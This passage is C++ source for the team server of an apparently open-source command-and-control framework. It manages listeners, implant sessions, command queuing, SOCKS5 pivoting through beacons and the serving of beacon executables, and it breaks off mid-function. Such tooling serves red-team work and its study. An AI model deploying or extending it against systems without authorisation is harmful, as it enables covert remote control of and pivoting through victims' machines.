#include "TeamServer.hpp"

#include <dlfcn.h>

#include <functional>
#include <fstream>
#include <filesystem>

using namespace std;
using namespace std::placeholders;
namespace fs = std::filesystem;

using json = nlohmann::json;


typedef ModuleCmd* (*constructProc)();


TeamServer::TeamServer(const nlohmann::json& config) 
: m_config(config)
, m_isSocksServerRunning(false)
{
	// Logger
	std::vector<spdlog::sink_ptr> sinks;

	auto console_sink = std::make_shared<spdlog::sinks::stdout_color_sink_mt>();
	console_sink->set_level(spdlog::level::info);
    sinks.push_back(console_sink);

	auto file_sink = std::make_shared<spdlog::sinks::rotating_file_sink_mt>("logs/TeamServer.txt", 1024*1024*10, 3);
	file_sink->set_level(spdlog::level::trace);
	sinks.push_back(file_sink);

    m_logger = std::make_shared<spdlog::logger>("TeamServer", begin(sinks), end(sinks));

	std::string logLevel = config["LogLevel"].get<std::string>();
	m_logger->set_level(spdlog::level::trace);

	// Config directory
	m_teamServerModulesDirectoryPath = config["TeamServerModulesDirectoryPath"].get<std::string>();
	m_linuxModulesDirectoryPath = config["LinuxModulesDirectoryPath"].get<std::string>();
	m_windowsModulesDirectoryPath = config["WindowsModulesDirectoryPath"].get<std::string>();
	m_linuxBeaconsDirectoryPath = config["LinuxBeaconsDirectoryPath"].get<std::string>();
	m_windowsBeaconsDirectoryPath = config["WindowsBeaconsDirectoryPath"].get<std::string>();
	m_toolsDirectoryPath = config["ToolsDirectoryPath"].get<std::string>();
	m_scriptsDirectoryPath = config["ScriptsDirectoryPath"].get<std::string>();

	fs::path checkPath = m_teamServerModulesDirectoryPath;
	if (!fs::exists(checkPath))
		m_logger->error("TeamServer modules directory path don't exist: {0}", m_teamServerModulesDirectoryPath.c_str());

	checkPath = m_linuxModulesDirectoryPath;
	if (!fs::exists(checkPath))
		m_logger->error("Linux modules directory path don't exist: {0}", m_linuxModulesDirectoryPath.c_str());

	checkPath = m_windowsModulesDirectoryPath;
	if (!fs::exists(checkPath))
		m_logger->error("Windows modules directory path don't exist: {0}", m_windowsModulesDirectoryPath.c_str());

	checkPath = m_linuxBeaconsDirectoryPath;
	if (!fs::exists(checkPath))
		m_logger->error("Linux beacon directory path don't exist: {0}", m_linuxBeaconsDirectoryPath.c_str());

	checkPath = m_windowsBeaconsDirectoryPath;
	if (!fs::exists(checkPath))
		m_logger->error("Windows beacon directory path don't exist: {0}", m_windowsBeaconsDirectoryPath.c_str());

	checkPath = m_toolsDirectoryPath;
	if (!fs::exists(checkPath))
		m_logger->error("Tools directory path don't exist: {0}", m_toolsDirectoryPath.c_str());

	checkPath = m_scriptsDirectoryPath;
	if (!fs::exists(checkPath))
		m_logger->error("Script directory path don't exist: {0}", m_scriptsDirectoryPath.c_str());

	m_commonCommands.setDirectories(m_teamServerModulesDirectoryPath,
		m_linuxModulesDirectoryPath,
		m_windowsModulesDirectoryPath,
		m_linuxBeaconsDirectoryPath,
		m_windowsBeaconsDirectoryPath,
		m_toolsDirectoryPath,
		m_scriptsDirectoryPath);

	// Modules
	m_logger->info("TeamServer module directory path {0}", m_teamServerModulesDirectoryPath.c_str());
	try 
	{
        for (const auto& entry : fs::recursive_directory_iterator(m_teamServerModulesDirectoryPath)) 
		{
            if (fs::is_regular_file(entry.path()) && entry.path().extension() == ".so") 
			{
				m_logger->info("Trying to load {0}", entry.path().c_str());

				void *handle = dlopen(entry.path().c_str(), RTLD_LAZY);

				if (!handle) 
				{
					m_logger->warn("Failed to load {0}", entry.path().c_str());
					continue;
				}

				std::string funcName = entry.path().filename();
				funcName = funcName.substr(3); 							// remove lib
				funcName = funcName.substr(0, funcName.length() - 3);	// remove .so
				funcName += "Constructor";								// add Constructor

				m_logger->info("Looking for construtor function {0}", funcName);

				constructProc construct = (constructProc)dlsym(handle, funcName.c_str());
				if(construct == NULL) 
				{
					m_logger->warn("Failed to find construtor");
					dlclose(handle);
					continue;
				}

				ModuleCmd* moduleCmd = construct();

				std::unique_ptr<ModuleCmd> moduleCmd_(moduleCmd);
				m_moduleCmd.push_back(std::move(moduleCmd_));

				m_moduleCmd.back()->setDirectories(m_teamServerModulesDirectoryPath,
					m_linuxModulesDirectoryPath,
					m_windowsModulesDirectoryPath,
					m_linuxBeaconsDirectoryPath,
					m_windowsBeaconsDirectoryPath,
					m_toolsDirectoryPath,
					m_scriptsDirectoryPath);

				m_logger->info("Module {0} loaded", entry.path().filename().c_str());
            }
        }
    }
	catch (const std::filesystem::filesystem_error& e) 
	{
		m_logger->warn("Error accessing module directory");
    }	
}


TeamServer::~TeamServer()
{
}


// Get the list of liseteners from primary listeners
// and from listeners runing on beacon through sessionListener
grpc::Status TeamServer::GetListeners(grpc::ServerContext* context, const teamserverapi::Empty* empty, grpc::ServerWriter<teamserverapi::Listener>* writer)
{
	m_logger->trace("GetListeners");

	for (int i = 0; i < m_listeners.size(); i++)
	{
		// For each primary listeners get the informations
		teamserverapi::Listener listener;
		listener.set_listenerhash(m_listeners[i]->getListenerHash());

		std::string type = m_listeners[i]->getType();
		listener.set_type(type);
		if(type == ListenerHttpType || type == ListenerHttpsType )
		{
			listener.set_ip(m_listeners[i]->getParam1());
			listener.set_port(std::stoi(m_listeners[i]->getParam2()));
		}
		else if(type == ListenerTcpType )
		{
			listener.set_ip(m_listeners[i]->getParam1());
			listener.set_port(std::stoi(m_listeners[i]->getParam2()));
		}
		else if(type == ListenerSmbType )
		{
			listener.set_domain(m_listeners[i]->getParam1());
		}
		else if(type == ListenerGithubType )
		{
			listener.set_project(m_listeners[i]->getParam1());
			listener.set_token(m_listeners[i]->getParam2());
		}
		else if(type == ListenerDnsType )
		{
			listener.set_domain(m_listeners[i]->getParam1());
			listener.set_port(std::stoi(m_listeners[i]->getParam2()));
		}
		listener.set_numberofsession(m_listeners[i]->getNumberOfSession());	

		writer->Write(listener);

		// check for each sessions alive from this listener check if their is listeners
		int nbSession = m_listeners[i]->getNumberOfSession();
		for(int kk=0; kk<nbSession; kk++)
		{
			std::shared_ptr<Session> session = m_listeners[i]->getSessionPtr(kk);

			if(!session->isSessionKilled())
			{
				for(auto it = session->getListener().begin() ; it != session->getListener().end(); ++it )
				{
					m_logger->trace(" |-> sessionListenerList {0} {1} {0}", it->getType(), it->getParam1(), it->getParam2());

					teamserverapi::Listener listener;
					listener.set_listenerhash(it->getListenerHash());
					std::string type = it->getType();
					listener.set_type(type);
					if(type == ListenerTcpType )
					{
						listener.set_ip(it->getParam1());
						listener.set_port(std::stoi(it->getParam2()));
					}
					else if(type == ListenerSmbType )
					{
						listener.set_domain(it->getParam1());
					}

					writer->Write(listener);
				}
			}
		}
	}

	m_logger->trace("GetListeners end");

	return grpc::Status::OK;
}


// Add listener that will run on the C2
// To add a listener to a beacon the process it to send a command to the beacon
grpc::Status TeamServer::AddListener(grpc::ServerContext* context, const teamserverapi::Listener* listenerToCreate,  teamserverapi::Response* response)
{
	m_logger->trace("AddListener");
	string type = listenerToCreate->type();

	try 
	{
		// TODO check if constructor completed befor the push_back
		if (type == ListenerTcpType)
		{
			int localPort = listenerToCreate->port();
			string localHost = listenerToCreate->ip();
			std::shared_ptr<ListenerTcp> listenerTcp = make_shared<ListenerTcp>(localHost, localPort);
			listenerTcp->setIsPrimary();
			m_listeners.push_back(std::move(listenerTcp));

			m_logger->info("AddListener Tcp {0}:{1}", localHost, std::to_string(localPort));
		}
		else if (type == ListenerHttpType)
		{
			json configHttp = m_config["ListenerHttpConfig"];
			
			int localPort = listenerToCreate->port();
			string localHost = listenerToCreate->ip();
			std::shared_ptr<ListenerHttp> listenerHttp = make_shared<ListenerHttp>(localHost, localPort, configHttp, false);
			listenerHttp->setIsPrimary();
			m_listeners.push_back(std::move(listenerHttp));

			m_logger->info("AddListener Http {0}:{1}", localHost, std::to_string(localPort));
		}
		else if (type == ListenerHttpsType)
		{
			json configHttps = m_config["ListenerHttpsConfig"];

			int localPort = listenerToCreate->port();
			string localHost = listenerToCreate->ip();
			std::shared_ptr<ListenerHttp> listenerHttps = make_shared<ListenerHttp>(localHost, localPort, configHttps, true);
			listenerHttps->setIsPrimary();
			m_listeners.push_back(std::move(listenerHttps));

			m_logger->info("AddListener Https {0}:{1}", localHost, std::to_string(localPort));
		}
		else if (type == ListenerGithubType)
		{
			std::string token = listenerToCreate->token();
			std::string project = listenerToCreate->project();
			std::shared_ptr<ListenerGithub> listenerGithub = make_shared<ListenerGithub>(project, token);
			listenerGithub->setIsPrimary();
			m_listeners.push_back(std::move(listenerGithub));

			m_logger->info("AddListener Github {0}:{1}", project, token);
		}
		else if (type == ListenerDnsType)
		{
			std::string domain = listenerToCreate->domain();
			int port = listenerToCreate->port();
			std::shared_ptr<ListenerDns> listenerDns = make_shared<ListenerDns>(domain, port);
			listenerDns->setIsPrimary();
			m_listeners.push_back(std::move(listenerDns));

			m_logger->info("AddListener Dns {0}:{1}", domain, std::to_string(port));
		}

	}
	catch (const std::exception &exc)
	{
		m_logger->error("Error: {0}", exc.what());
	}

	m_logger->trace("AddListener End");

	return grpc::Status::OK;
}


grpc::Status TeamServer::StopListener(grpc::ServerContext* context, const teamserverapi::Listener* listenerToStop,  teamserverapi::Response* response)
{
	m_logger->trace("StopListener");

	// Stop primary listener
	std::string listenerHash=listenerToStop->listenerhash();

	std::vector<shared_ptr<Listener>>::iterator object = 
		find_if(m_listeners.begin(), m_listeners.end(),
				[&](shared_ptr<Listener> & obj){ return obj->getListenerHash() == listenerHash;}
				);

	if(object!=m_listeners.end())
	{
		m_listeners.erase(std::remove(m_listeners.begin(), m_listeners.end(), *object));
	}

	// Stop listerners runing on beacon by sending a messsage to this beacon
	for (int i = 0; i < m_listeners.size(); i++)
	{
		int nbSession = m_listeners[i]->getNumberOfSession();
		for(int kk=0; kk<nbSession; kk++)
		{
			std::shared_ptr<Session> session = m_listeners[i]->getSessionPtr(kk);
			std::vector<SessionListener> sessionListener = session->getListener();
			for (int j = 0; j < sessionListener.size(); j++)
			{
				if(listenerHash==sessionListener[j].getListenerHash())
				{
					std::string input = "listener stop ";
					input+=sessionListener[j].getListenerHash();
					std::string beaconHash = session->getBeaconHash();

					if (!input.empty())
					{
						C2Message c2Message;
						int res = prepMsg(input, c2Message);

						// echec init message
						if(res!=0)
						{
							std::string hint = c2Message.returnvalue();

							response->set_message(hint);
							response->set_status(teamserverapi::KO);
						}

						if(!c2Message.instruction().empty())
							m_listeners[i]->queueTask(beaconHash, c2Message);
					}
				}
			}
		}
	}

	m_logger->trace("StopListener End");

	return grpc::Status::OK;
}


bool TeamServer::isListenerAlive(std::string listenerHash)
{
	m_logger->trace("isListenerAlive");

	bool result=false;
	for (int i = 0; i < m_listeners.size(); i++)
	{
		if(m_listeners[i]->getListenerHash()==listenerHash)
		{
			result=true;
			return result;
		}

		// check for each sessions alive from this listener check if their is listeners
		int nbSession = m_listeners[i]->getNumberOfSession();
		for(int kk=0; kk<nbSession; kk++)
		{
			std::shared_ptr<Session> session = m_listeners[i]->getSessionPtr(kk);

			std::vector<SessionListener> sessionListenerList;
			if(!session->isSessionKilled())
			{
				sessionListenerList.insert(sessionListenerList.end(), session->getListener().begin(), session->getListener().end());

				for (int j = 0; j < sessionListenerList.size(); j++)
				{
					if(sessionListenerList[j].getListenerHash()==listenerHash)
					{
						result=true;
						return result;
					}
				}
			}
		}
	}

	m_logger->trace("isListenerAlive end");

	return result;
}


// Get the list of sessions on the primary listeners
// Primary listers old all the information about beacons linked to themeself and linked to beacon listerners
grpc::Status TeamServer::GetSessions(grpc::ServerContext* context, const teamserverapi::Empty* empty, grpc::ServerWriter<teamserverapi::Session>* writer)
{
	m_logger->trace("GetSessions");

	for (int i = 0; i < m_listeners.size(); i++)
	{
		m_logger->debug("Listener {0}", m_listeners[i]->getListenerHash());

		int nbSession = m_listeners[i]->getNumberOfSession();
		for(int kk=0; kk<nbSession; kk++)
		{
			std::shared_ptr<Session> session = m_listeners[i]->getSessionPtr(kk);

			m_logger->debug("	Session {0} From {1} {2}", session->getBeaconHash(), session->getListenerHash(), session->getLastProofOfLife());

			teamserverapi::Session sessionTmp;
			sessionTmp.set_listenerhash(session->getListenerHash());
			sessionTmp.set_beaconhash(session->getBeaconHash());
			sessionTmp.set_hostname(session->getHostname());
			sessionTmp.set_username(session->getUsername());
			sessionTmp.set_arch(session->getArch());
			sessionTmp.set_privilege(session->getPrivilege());
			sessionTmp.set_os(session->getOs());
			sessionTmp.set_lastproofoflife(session->getLastProofOfLife());
			sessionTmp.set_killed(session->isSessionKilled());

			bool result = isListenerAlive(session->getListenerHash());

			if(!session->isSessionKilled() && result)
				writer->Write(sessionTmp);
		}
	}

	m_logger->trace("GetSessions end");

	return grpc::Status::OK;
}


grpc::Status TeamServer::StopSession(grpc::ServerContext* context, const teamserverapi::Session* sessionToStop,  teamserverapi::Response* response)
{
	m_logger->trace("StopSession");

	std::string beaconHash=sessionToStop->beaconhash();
	std::string listenerHash=sessionToStop->listenerhash();

	if(beaconHash.size()==SizeBeaconHash)
	{
		for (int i = 0; i < m_listeners.size(); i++)
		{
			if (m_listeners[i]->isSessionExist(beaconHash, listenerHash))
			{
				std::string endCmd;
				endCmd = EndCmd;

				C2Message c2Message;
				int res = prepMsg(endCmd, c2Message);

				if(res!=0)
				{
					std::string hint = c2Message.returnvalue();

					response->set_message(hint);
					response->set_status(teamserverapi::KO);
				}

				if(!c2Message.instruction().empty())
				{
					m_listeners[i]->queueTask(beaconHash, c2Message);
					m_listeners[i]->markSessionKilled(beaconHash);
				}

				return grpc::Status::OK;
			}
		}
	}

	m_logger->trace("StopSession end");

	return grpc::Status::OK;
}


// Launch a socks5 server on the TeamServer
// Only one socksServer at a time
// Then upon connection to the socks5 server, send an init message to the target beacon 
// Upon positive response of the beacon for the binding of the ip/port finalise the handshack 
// Then we relay the data send to the socks5 server to the requested beacon
void TeamServer::runSocksServer(int port, const std::string& listenerHash, const std::string& beaconHash)
{
	// Start SocksServer
	SocksServer socksServer(port);
	socksServer.launch();

	while(!socksServer.isServerLaunched())
	{
		std::this_thread::sleep_for(std::chrono::milliseconds(50));
		m_logger->info("Wait for SocksServer to start on port {}", port);
	}

	if(socksServer.isServerStoped())
	{
		m_logger->warn("Start SocksServer failed on port {}", port);
		return;
	}

	m_isSocksServerRunning=true;

	m_logger->info("Start SocksServer succeed on port {}", port);

	std::shared_ptr<Listener> socksListener;
	for (int i = 0; i < m_listeners.size(); i++)
	{
		if(listenerHash==m_listeners[i]->getListenerHash())
			socksListener = m_listeners[i];
	}

	m_logger->info("SocksListener ok");

	std::shared_ptr<Session> session;
	for(int kk=0; kk<socksListener->getNumberOfSession(); kk++)
	{
		if(socksListener->getSessionPtr(kk)->getBeaconHash()==beaconHash)
			session = socksListener->getSessionPtr(kk);
	}

	m_logger->info("Session ok");

	// Start socks beacon side
	C2Message c2MessageStartSocks;
	c2MessageStartSocks.set_instruction(Socks5Cmd);
	c2MessageStartSocks.set_cmd(StartCmd);
	c2MessageStartSocks.set_pid(port);
	socksListener->queueTask(beaconHash, c2MessageStartSocks);

	m_logger->info("Force sleep to 10ms to allow socks communication");
	C2Message c2MessageControlSleep;
	c2MessageControlSleep.set_instruction(SleepCmd);
	c2MessageControlSleep.set_cmd("0.01");
	socksListener->queueTask(beaconHash, c2MessageControlSleep);
	
	std::string dataIn;
    std::string dataOut;
	bool isSocksServerRunning=true;
	while(isSocksServerRunning)
    {
		// if session is killed (beacon probably dead) we end the server
		if(session->isSessionKilled())
		{
			socksServer.stop();
			isSocksServerRunning=false;

			for(int i=0; i<socksServer.m_socksTunnelServers.size(); i++)
				socksServer.m_socksTunnelServers[i].reset(nullptr);
		}

		C2Message c2Message = socksListener->getSocksTaskResult(beaconHash);

		// if the beacon request stopSocks we end the server
		if(c2Message.instruction() == Socks5Cmd && c2Message.cmd() == "stopSocks")
		{	
			socksServer.stop();
			isSocksServerRunning=false;

			for(int i=0; i<socksServer.m_socksTunnelServers.size(); i++)
				socksServer.m_socksTunnelServers[i].reset(nullptr);
		}

        for(int i=0; i<socksServer.m_socksTunnelServers.size(); i++)
        {
            if(socksServer.m_socksTunnelServers[i]!=nullptr)
            {
				int id = socksServer.m_socksTunnelServers[i]->getId();
				SocksState state = socksServer.m_socksTunnelServers[i]->getState();
				if(state == SocksState::INIT)
				{
					int ip = socksServer.m_socksTunnelServers[i]->getIpDst();
					int port = socksServer.m_socksTunnelServers[i]->getPort();
					
					m_logger->info("Socks5 to {}:{}", std::to_string(ip), std::to_string(port));

					C2Message c2MessageToSend;
					c2MessageToSend.set_instruction(Socks5Cmd);
					c2MessageToSend.set_cmd("init");
					c2MessageToSend.set_data(std::to_string(ip));
					c2MessageToSend.set_args(std::to_string(port));
					c2MessageToSend.set_pid(id);

					if(!c2MessageToSend.instruction().empty())
						socksListener->queueTask(beaconHash, c2MessageToSend);

					socksServer.m_socksTunnelServers[i]->setState(SocksState::HANDSHAKE);
				}
				else if(state == SocksState::HANDSHAKE)
				{
					m_logger->info("Socks5 wait handshake {}", id);

					if(c2Message.instruction() == Socks5Cmd && c2Message.cmd() == "init" && c2Message.pid() == id)
					{
						m_logger->info("Socks5 handshake received {}", id);

						if(c2Message.data() == "fail")
						{
							m_logger->info("Socks5 handshake failed {}", id);
							socksServer.m_socksTunnelServers[i].reset(nullptr);
						}
						else
						{
							m_logger->info("Socks5 handshake succed {}", id);
							socksServer.m_socksTunnelServers[i]->finishHandshack();
							socksServer.m_socksTunnelServers[i]->setState(SocksState::RUN);

							dataIn="";
							int res = socksServer.m_socksTunnelServers[i]->process(dataIn, dataOut);

							if(res<=0)
							{
								m_logger->info("Socks5 stop");

								socksServer.m_socksTunnelServers[i].reset(nullptr);

								C2Message c2MessageToSend;
								c2MessageToSend.set_instruction(Socks5Cmd);
								c2MessageToSend.set_cmd("stop");
								c2MessageToSend.set_pid(id);

								if(!c2MessageToSend.instruction().empty())
									socksListener->queueTask(beaconHash, c2MessageToSend);
							}
							else
							{
								m_logger->info("Socks5 send data to beacon");

								C2Message c2MessageToSend;
								c2MessageToSend.set_instruction(Socks5Cmd);
								c2MessageToSend.set_cmd("run");
								c2MessageToSend.set_pid(id);
								c2MessageToSend.set_data(dataOut);

								if(!c2MessageToSend.instruction().empty())
									socksListener->queueTask(beaconHash, c2MessageToSend);
							}
						}
					}
					else if(c2Message.instruction() == Socks5Cmd && c2Message.cmd() == "stop" && c2Message.pid() == id)
					{
						socksServer.m_socksTunnelServers[i].reset(nullptr);
					}
				}
				else if(state == SocksState::RUN)
				{
					m_logger->info("Socks5 run {}", id);

					dataIn="";
					if(c2Message.instruction() == Socks5Cmd && c2Message.cmd() == "run" && c2Message.pid() == id)
					{
						m_logger->info("Socks5 {}: data received from beacon", id);

						dataIn=c2Message.data();
					
						int res = socksServer.m_socksTunnelServers[i]->process(dataIn, dataOut);

						m_logger->info("Socks5 process, res {}, dataIn {}, dataOut {}", res, dataIn.size(), dataOut.size());

						// TODO do we stop if dataOut.size()==0 ????
						// if(res<=0 || dataOut.size()==0)
						if(res<=0)
						{
							m_logger->info("Socks5 stop");

							socksServer.m_socksTunnelServers[i].reset(nullptr);

							C2Message c2MessageToSend;
							c2MessageToSend.set_instruction(Socks5Cmd);
							c2MessageToSend.set_cmd("stop");
							c2MessageToSend.set_pid(id);

							if(!c2MessageToSend.instruction().empty())
								socksListener->queueTask(beaconHash, c2MessageToSend);
						}
						else
						{
							m_logger->info("Socks5 send data to beacon");

							C2Message c2MessageToSend;
							c2MessageToSend.set_instruction(Socks5Cmd);
							c2MessageToSend.set_cmd("run");
							c2MessageToSend.set_pid(id);
							c2MessageToSend.set_data(dataOut);

							if(!c2MessageToSend.instruction().empty())
								socksListener->queueTask(beaconHash, c2MessageToSend);
						}
					}
					else if(c2Message.instruction() == Socks5Cmd && c2Message.cmd() == "stop" && c2Message.pid() == id)
					{
						socksServer.m_socksTunnelServers[i].reset(nullptr);
					}
				}
            }
        }

		// Remove ended tunnels
		socksServer.cleanTunnel();

        std::this_thread::sleep_for(std::chrono::milliseconds(20));
    }

	m_isSocksServerRunning = false;
	m_logger->info("End SocksServer {}", port);

    return;
}


grpc::Status TeamServer::SendCmdToSession(grpc::ServerContext* context, const teamserverapi::Command* command,  teamserverapi::Response* response)
{
	m_logger->trace("SendCmdToSession");

	std::string input = command->cmd();
	std::string beaconHash = command->beaconhash();
	std::string listenerHash = command->listenerhash();
	
	for (int i = 0; i < m_listeners.size(); i++)
	{
		if (m_listeners[i]->isSessionExist(beaconHash, listenerHash))
		{
			m_logger->trace("SendCmdToSession: beaconHash {0} listenerHash {1}", beaconHash, listenerHash);
			if (!input.empty())
			{
				C2Message c2Message;
				int res = prepMsg(input, c2Message);

				m_logger->debug("SendCmdToSession {0} {1} {2}", beaconHash, c2Message.instruction(), c2Message.cmd());

				// echec init message
				if(res!=0)
				{
					std::string hint = c2Message.returnvalue();

					response->set_message(hint);
					response->set_status(teamserverapi::KO);

					m_logger->debug("SendCmdToSession Fail prepMsg {0}", hint);
				}

				// Start a thread that handle all the communication with the beacon
				if(c2Message.instruction() == Socks5Cmd && c2Message.cmd() == StartCmd)
				{
					if(m_isSocksServerRunning==true)
					{
						m_logger->warn("A SockServer is already running");
					}
					else
					{
						// start the server and launch a thread to handle socks messages
						int port = std::atoi(c2Message.data().c_str());

						std::thread t(&TeamServer::runSocksServer, this, port, m_listeners[i]->getListenerHash(), beaconHash);
						t.detach();
					}

					// the start cmd is send by the thread to be sur that the server started succesfully
					continue;
				}

				if(!c2Message.instruction().empty())
					m_listeners[i]->queueTask(beaconHash, c2Message);
			}
		}
	}

	m_logger->trace("SendCmdToSession end");

	return grpc::Status::OK;
}


// TODO how do the followUp necessary for download
grpc::Status TeamServer::GetResponseFromSession(grpc::ServerContext* context, const teamserverapi::Session* session,  grpc::ServerWriter<teamserverapi::CommandResponse>* writer)
{
	m_logger->trace("GetResponseFromSession");

	std::string targetSession=session->beaconhash();

	for (int i = 0; i < m_listeners.size(); i++)
	{
		int nbSession = m_listeners[i]->getNumberOfSession();
		for(int kk=0; kk<nbSession; kk++)
		{
			std::shared_ptr<Session> session = m_listeners[i]->getSessionPtr(kk);
			std::string beaconHash = session->getBeaconHash();

			if(targetSession==beaconHash)
			{
				C2Message c2Message = m_listeners[i]->getTaskResult(beaconHash);
				while(!c2Message.instruction().empty())
				{
					std::string instruction = c2Message.instruction();					
					std::string errorMsg;
					for(auto it = m_moduleCmd.begin() ; it != m_moduleCmd.end(); ++it )
					{
						// TODO djb2 don't produce the same result in windows and linux compilation....
						if (instruction == (*it)->getName() || instruction == std::to_string((*it)->getHash()))
						{
							instruction = (*it)->getName();

							m_logger->debug("Call followUp");

							// TODO to put in a separate thread
							(*it)->followUp(c2Message);

							(*it)->errorCodeToMsg(c2Message, errorMsg);
						}
					}

					if(instruction==ListenerPollCmd)
					{
						m_logger->debug("beaconHash {0}", beaconHash);
						m_logger->debug("returnvalue {0}", c2Message.returnvalue());
						c2Message = m_listeners[i]->getTaskResult(beaconHash);
						continue;
					}
					
					m_logger->debug("GetResponseFromSession {0} {1} {2}", beaconHash, c2Message.instruction(), c2Message.cmd());

					teamserverapi::CommandResponse commandResponseTmp;
					commandResponseTmp.set_beaconhash(beaconHash);
					commandResponseTmp.set_instruction(instruction);
					commandResponseTmp.set_cmd(c2Message.cmd());		
					if(!errorMsg.empty())
					{
						commandResponseTmp.set_response(errorMsg);
						writer->Write(commandResponseTmp);
					}
					else if(!c2Message.returnvalue().empty())
					{
						commandResponseTmp.set_response(c2Message.returnvalue());
						writer->Write(commandResponseTmp);
					}
					else
					{
						m_logger->debug("GetResponseFromSession no output");
					}

					c2Message = m_listeners[i]->getTaskResult(beaconHash);
				}
			}
		}
	}

	m_logger->trace("GetResponseFromSession end");

	return grpc::Status::OK;
}


grpc::Status TeamServer::GetHelp(grpc::ServerContext* context, const teamserverapi::Command* command,  teamserverapi::CommandResponse* commandResponse)
{
	m_logger->trace("GetHelp");

	std::string input = command->cmd();

	if (input.empty())
		return grpc::Status::OK;

	std::vector<std::string> splitedCmd;
	std::string delimiter = " ";
	splitList(input, delimiter, splitedCmd);

	string instruction = splitedCmd[0];

	std::string output;
	if (instruction == HelpCmd)
	{
		if (splitedCmd.size() < 2)
		{
			for(int i=0; i<m_commonCommands.getNumberOfCommand(); i++)
			{
				output += m_commonCommands.getCommand(i);
				output += "\n";
			}
			for (auto it = m_moduleCmd.begin(); it != m_moduleCmd.end(); ++it)
			{
				output += (*it)->getName();
				output += "\n";
			}
		}
		else
		{
			string instruction = splitedCmd[1];
			bool isModuleFound=false;
			for(int i=0; i<m_commonCommands.getNumberOfCommand(); i++)
			{
				if(instruction == m_commonCommands.getCommand(i))
				{
					output += m_commonCommands.getHelp(instruction);
					output += "\n";
					isModuleFound=true;
				}
			}
			for (auto it = m_moduleCmd.begin(); it != m_moduleCmd.end(); ++it)
			{
				if (instruction == (*it)->getName())
				{
					output += (*it)->getInfo();
					output += "\n";
					isModuleFound=true;
				}
			}
			if(!isModuleFound)
			{
				output += "Module ";
				output += instruction;
				output += " not found.";
				output += "\n";
			}
		}
	}

	teamserverapi::CommandResponse commandResponseTmp;
	commandResponseTmp.set_cmd(input);
	commandResponseTmp.set_response(output);

	*commandResponse = commandResponseTmp;

	m_logger->trace("GetHelp end");

	return grpc::Status::OK;
}


// Split input based on spaces and single quotes
// Use single quote to passe aguments as a single parameters even if it's contain spaces
// Singles quotes are removed
void static inline splitInputCmd(const std::string& input, std::vector<std::string>& splitedList)
{
	std::string tmp="";
	for( size_t i=0; i<input.size(); i++)
	{
		char c = input[i];
		if( c == ' ' )
		{
			if(!tmp.empty())
				splitedList.push_back(tmp);
			tmp="";
		}
		else if(c == '\'' )
		{
			i++;
			while( input[i] != '\'' )
			{ tmp+=input[i]; i++; }
		}
		else
		{
			tmp+=c;
		}
	}

	if(!tmp.empty())
		splitedList.push_back(tmp);
}


std::string getIPAddress(std::string &interface)
{
    string ipAddress="";
    struct ifaddrs *interfaces = NULL;
    struct ifaddrs *temp_addr = NULL;
    int success = 0;
    success = getifaddrs(&interfaces);
    if (success == 0) 
	{
        temp_addr = interfaces;
        while(temp_addr != NULL) 
		{
            if(temp_addr->ifa_addr->sa_family == AF_INET) 
			{ 
                if(strcmp(temp_addr->ifa_name, interface.c_str())==0)
				{
                    ipAddress=inet_ntoa(((struct sockaddr_in*)temp_addr->ifa_addr)->sin_addr);
                }
            }
            temp_addr = temp_addr->ifa_next;
        }
    }
    freeifaddrs(interfaces);
    return ipAddress;
}


grpc::Status TeamServer::SendTermCmd(grpc::ServerContext* context, const teamserverapi::TermCommand* command,  teamserverapi::TermCommand* response)
{
	m_logger->trace("SendTermCmd");

	std::string cmd = command->cmd();
	m_logger->debug("SendTermCmd {0}",cmd);

	std::vector<std::string> splitedCmd;
	splitInputCmd(cmd, splitedCmd);

	teamserverapi::TermCommand responseTmp;
	std::string none="";
	responseTmp.set_cmd(none);
	responseTmp.set_result(none);
	responseTmp.set_data(none);

	string instruction = splitedCmd[0];
	if(instruction=="infoListener")
	{
		m_logger->info("infoListener {0}", cmd);

		if(splitedCmd.size()==2)
		{
			std::string listenerHash = splitedCmd[1];

			for (int i = 0; i < m_listeners.size(); i++)
			{
				std::string hash = m_listeners[i]->getListenerHash();
				if (hash.find(listenerHash) != std::string::npos) 
				{
					std::string type = m_listeners[i]->getType();

					std::string domainName="";
					auto it = m_config.find("DomainName");
					if(it != m_config.end())
						domainName = m_config["DomainName"].get<std::string>();

					std::string exposedIp="";
					it = m_config.find("ExposedIp");
					if(it != m_config.end())
						exposedIp = m_config["ExposedIp"].get<std::string>();

					std::string interface="";
					it = m_config.find("IpInterface");
					if(it != m_config.end())
						interface = m_config["IpInterface"].get<std::string>();

					std::string ip = "";
					if(!interface.empty())
						ip = getIPAddress(interface);

					if(ip.empty() && domainName.empty() && exposedIp.empty())
					{
						responseTmp.set_result("Error: No IP or Hostname in config.");
						*response = responseTmp;
						return grpc::Status::OK;
					}

					std::string port = m_listeners[i]->getParam2();
					std::string uriFileDownload = "";

					if (type == ListenerHttpType)
					{
						json configHttp = m_config["ListenerHttpConfig"];

						auto it = configHttp[0].find("uriFileDownload");
						if(it != configHttp[0].end())
							uriFileDownload = configHttp[0]["uriFileDownload"].get<std::string>();
										
					}
					else if (type == ListenerHttpsType)
					{
						json configHttps = m_config["ListenerHttpsConfig"];

						auto it = configHttps[0].find("uriFileDownload");
						if(it != configHttps[0].end())
							uriFileDownload = configHttps[0]["uriFileDownload"].get<std::string>();;
					}

					std::string result=type;
					result+="\n";
					if(!domainName.empty())
						result+=domainName;
					else if(!exposedIp.empty())
						result+=exposedIp;
					else if(!ip.empty())
						result+=ip;
					result+="\n";
					result+=port;
					result+="\n";
					result+=uriFileDownload;

					responseTmp.set_result(result);
				}
			}

			if(responseTmp.result().empty())
			{
				responseTmp.set_result("Error: Listener not found.");
				*response = responseTmp;
				return grpc::Status::OK;
			}
		}
		else
		{
			responseTmp.set_result("Error: infoListener take one arguement.");
			*response = responseTmp;
			return grpc::Status::OK;
		}
	}
	else if(instruction=="getBeaconBinary")
	{
		m_logger->info("getBeaconBinary {0}", cmd);

		if(splitedCmd.size()==2)
		{
			std::string listenerHash = splitedCmd[1];
			for (int i = 0; i < m_listeners.size(); i++)
			{
				std::string hash = m_listeners[i]->getListenerHash();
				if (hash.find(listenerHash) != std::string::npos) 
				{
					std::string type = m_listeners[i]->getType();
					std::string beaconFilePath = "";
					if(type == ListenerHttpType || type == ListenerHttpsType )
					{
						beaconFilePath  = m_windowsBeaconsDirectoryPath;
						beaconFilePath += "BeaconHttp.exe";
					}
					else if(type == ListenerTcpType )
					{
						beaconFilePath  = m_windowsBeaconsDirectoryPath;
						beaconFilePath += "BeaconTcp.exe";
					}
					else if(type == ListenerSmbType )
					{
